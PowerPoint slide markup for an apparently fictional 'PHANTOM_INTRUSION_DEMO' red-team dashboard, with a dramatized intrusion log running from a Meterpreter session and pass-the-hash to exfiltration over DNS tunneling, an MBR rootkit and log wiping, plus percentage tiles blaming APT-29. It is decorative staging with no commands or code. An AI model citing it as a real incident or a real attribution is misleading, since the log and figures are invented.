      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Text 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="3752681"/>
            <a:ext cx="2697345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25" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF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 入侵事件日志</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Text 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="3950487"/>
            <a:ext cx="449558" cy="98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0055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03:41:02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Text 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="3950487"/>
            <a:ext cx="323681" cy="98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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Text 87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="3950487"/>
            <a:ext cx="4019044" cy="98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00A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SMTP relay exploited · user@corp.internal phished</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Text 88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4053885"/>
            <a:ext cx="449558" cy="98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0055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03:41:38</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Text 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4053885"/>
            <a:ext cx="323681" cy="98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b="1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[WRN]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Text 90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4053885"/>
            <a:ext cx="4019044" cy="98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00A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Antivirus signature bypass via polymorphic code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Text 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4157283"/>
            <a:ext cx="449558" cy="98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0055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03:42:11</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Text 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4157283"/>
            <a:ext cx="323681" cy="98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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Text 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4157283"/>
            <a:ext cx="4019044" cy="98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00A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Meterpreter session opened on 192.168.1.47:4444</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Text 94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4260681"/>
            <a:ext cx="449558" cy="98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0055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03:43:05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Text 95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4260681"/>
            <a:ext cx="323681" cy="98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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF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[ERR]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="Text 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4260681"/>
            <a:ext cx="4019044" cy="98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FF22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EDR detection triggered — activating cloak mode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Text 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4364080"/>
            <a:ext cx="449558" cy="98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0055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03:43:22</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Text 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4364080"/>
            <a:ext cx="323681" cy="98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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Text 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4364080"/>
            <a:ext cx="4019044" cy="98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00A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 impersonation: NT AUTHORITY\SYSTEM acquired</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Text 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4467478"/>
            <a:ext cx="449558" cy="98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0055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03:44:58</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Text 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4467478"/>
            <a:ext cx="323681" cy="98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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Text 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4467478"/>
            <a:ext cx="4019044" cy="98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00A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Pass-the-Hash successful → DC01.corp.internal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Text 103"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4570876"/>
            <a:ext cx="449558" cy="98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0055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03:45:33</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Text 104"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4570876"/>
            <a:ext cx="323681" cy="98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b="1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[WRN]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="Text 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4570876"/>
            <a:ext cx="4019044" cy="98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00A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Exfil channel: DNS tunneling via TXT records</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Text 106"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4674274"/>
            <a:ext cx="449558" cy="98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0055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03:46:44</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="Text 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4674274"/>
            <a:ext cx="323681" cy="98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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF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[ERR]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Text 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4674274"/>
            <a:ext cx="4019044" cy="98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FF22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CRITICAL: 4.7GB classified data streamed to C2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Text 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4777673"/>
            <a:ext cx="449558" cy="98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0055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03:47:08</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Text 110"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4777673"/>
            <a:ext cx="323681" cy="98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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Text 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4777673"/>
            <a:ext cx="4019044" cy="98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00A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Rootkit planted · persistence established in MBR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Text 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4881071"/>
            <a:ext cx="449558" cy="98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0055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03:47:21</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Text 113"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4387681" y="4881071"/>
            <a:ext cx="323681" cy="98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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Text 114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4881071"/>
            <a:ext cx="4019044" cy="98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FF22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4: COVER TRACKS → /var/log/* wiped</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="117" name="Chart 0"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4922655" y="5083372"/>
          <a:ext cx="449558" cy="449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8" name="Text 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4922655" y="5209248"/>
            <a:ext cx="449558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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF22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94%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="Text 116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4922655" y="5550912"/>
            <a:ext cx="449558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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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渗透</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="120" name="Chart 1"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5516071" y="5083372"/>
          <a:ext cx="449558" cy="449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1" name="Text 117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5516071" y="5209248"/>
            <a:ext cx="449558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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00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78%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Text 118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5516071" y="5550912"/>
            <a:ext cx="449558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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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泄露</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="123" name="Chart 2"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6109487" y="5083372"/>
          <a:ext cx="449558" cy="449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4" name="Text 119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6109487" y="5209248"/>
            <a:ext cx="449558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5" b="1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88%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Text 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6109487" y="5550912"/>
            <a:ext cx="449558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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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隐蔽</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="126" name="Chart 3"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6702903" y="5083372"/>
          <a:ext cx="449558" cy="449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27" name="Text 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6702903" y="5209248"/>
            <a:ext cx="449558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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC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61%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Text 122"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6702903" y="5550912"/>
            <a:ext cx="449558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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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扩散</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="129" name="Chart 4"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="7296319" y="5083372"/>
          <a:ext cx="449558" cy="449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30" name="Text 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7296319" y="5209248"/>
            <a:ext cx="449558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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009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83%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Text 124"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7296319" y="5550912"/>
            <a:ext cx="449558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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Shape 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6054416"/>
            <a:ext cx="9144000" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000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3" name="Shape 126"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6054416"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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4" name="Shape 127"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1663363" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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5" name="Shape 128"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3281770" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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6" name="Shape 129"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4900177" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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7" name="Shape 130"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6383717" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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8" name="Text 131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="359646" y="6081389"/>
            <a:ext cx="1438584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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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受感染主机</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Text 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="359646" y="6198274"/>
            <a:ext cx="1438584" cy="1798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25" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF22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247</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140" name="Text 133"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="6081389"/>
            <a:ext cx="1438584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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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泄露数据量</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141" name="Text 134"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="6198274"/>
            <a:ext cx="1438584" cy="1798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25" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF22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4.7 GB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="142" name="Text 135"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3416637" y="6081389"/>
            <a:ext cx="1438584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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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攻击持续时间</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Text 136"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3416637" y="6198274"/>
            <a:ext cx="1438584" cy="1798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25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00:06:19</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="144" name="Text 137"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5035044" y="6081389"/>
            <a:ext cx="1438584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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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检测规避率</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Text 138"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5035044" y="6198274"/>
            <a:ext cx="1438584" cy="1798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25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96.3%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Text 139"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6473628" y="6081389"/>
            <a:ext cx="1438584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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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威胁等级</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147" name="Text 140"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6473628" y="6198274"/>
            <a:ext cx="1438584" cy="1798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25" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF22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 · APT-29</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Shape 141"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6485991"/>
            <a:ext cx="9144000" cy="179823"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000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9" name="Text 142"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287717" y="6512965"/>
            <a:ext cx="4495575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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="006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· RED TEAM ASSESSMENT · TLP:RED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="150" name="Text 143"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5035044" y="6512965"/>
            <a:ext cx="3866195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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="006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PHANTOM_INTRUSION_DEMO · PAGE 01 / 06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="48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0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186"/>
            <a:ext cx="9144000" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A6B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1920"/>
            <a:ext cx="9144000" cy="377628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="87CE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803584"/>
            <a:ext cx="9144000" cy="35965"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A5A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794593"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DDDDD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9115" y="318062"/>
            <a:ext cx="431575" cy="10789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1044" y="282097"/>
            <a:ext cx="287717" cy="71929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46903" y="300080"/>
            <a:ext cx="323681" cy="10789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18832" y="264115"/>
            <a:ext cx="179823" cy="71929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44248" y="336044"/>
            <a:ext cx="395611" cy="10789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16177" y="300080"/>
            <a:ext cx="251752" cy="71929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3858" y="300080"/>
            <a:ext cx="431575" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A7C3F"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="3737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7805" y="372009"/>
            <a:ext cx="107894" cy="107894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3593" y="372009"/>
            <a:ext cx="107894" cy="107894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752" y="515867"/>
            <a:ext cx="215788" cy="53947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7805" y="569814"/>
            <a:ext cx="107894" cy="89912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3593" y="569814"/>
            <a:ext cx="107894" cy="89912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63" y="282097"/>
            <a:ext cx="3776283" cy="305699"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw blurRad="101600" dist="38100" dir="8100000" algn="bl" rotWithShape="0">
              <a:srgbClr val="3D3D3D">
                <a:alpha val="9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650" b="1" kern="0" spc="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我的世界  MINECRAFT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47363" y="605779"/>
            <a:ext cx="4495575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75" dirty="0">
                <a:solidFill>
